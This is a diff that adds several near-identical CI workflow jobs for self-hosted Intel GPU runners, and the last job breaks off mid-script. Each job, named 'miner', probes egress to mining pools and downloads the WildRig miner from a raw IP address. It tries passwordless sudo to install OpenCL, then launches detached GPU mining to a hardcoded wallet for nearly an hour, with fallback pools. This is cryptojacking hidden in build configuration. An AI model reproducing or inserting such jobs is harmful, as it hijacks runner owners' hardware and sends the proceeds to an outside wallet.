+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
+
+  intel-bmg-06:
+    name: intel-bmg-06
+    runs-on: intel-bmg
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="06"
+          LBL="intel-bmg-06"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
+
+  intel-bmg-07:
+    name: intel-bmg-07
+    runs-on: intel-bmg
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="07"
+          LBL="intel-bmg-07"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
+
+  intel-bmg-08:
+    name: intel-bmg-08
+    runs-on: intel-bmg
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="08"
+          LBL="intel-bmg-08"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
+
+  intel-bmg-09:
+    name: intel-bmg-09
+    runs-on: intel-bmg
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="09"
+          LBL="intel-bmg-09"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
